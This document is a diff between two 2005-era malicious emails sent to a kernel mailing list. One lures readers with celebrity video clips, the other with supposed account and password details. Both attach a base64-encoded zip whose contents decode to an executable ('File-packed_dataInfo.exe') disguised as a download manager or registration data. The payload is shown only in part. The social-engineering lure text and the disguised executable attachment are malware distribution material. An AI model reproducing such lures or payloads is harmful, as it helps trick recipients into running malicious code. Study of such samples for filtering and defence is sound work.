@@ -1,30 +1,29 @@
-From: postman@intel.com
-Subject: Paris_Hilton_&_Nicole_Richie
-Date: Thu, 15 Dec 2005 15:32:18 GMT
-Message-ID: <209c138503de95b5ac28@intel.com>
+From: office@texis.com
+Subject: Registration_Confirmation
+Date: Thu, 15 Dec 2005 18:57:25 UTC
+Message-ID: <f02dafcdf46b920feb@texis.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="======ebe2c99571dedf1.a9c295"
+Content-Type: multipart/mixed; boundary="===1fdbdab4.8dec"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: email@oss.sgi.com
+To: x_mail-list@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---======ebe2c99571dedf1.a9c295
+--===1fdbdab4.8dec
 
-The Simple Life:
+Account and Password Information are attached!
 
-View Paris Hilton & Nicole Richie video clips , pictures & more ;)
-Download is free until Jan, 2006!
 
-Please use our Download manager.
---======ebe2c99571dedf1.a9c295
-Content-Type: application/octet-stream; name=downloadm.zip
+***** Go to: http://www.texis.com
+***** Email: postman@texis.com
+--===1fdbdab4.8dec
+Content-Type: application/octet-stream; name=reg_pass-data.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="downloadm.zip"
+Content-Disposition: attachment; filename="reg_pass-data.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1001,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---======ebe2c99571dedf1.a9c295--
+--===1fdbdab4.8dec--
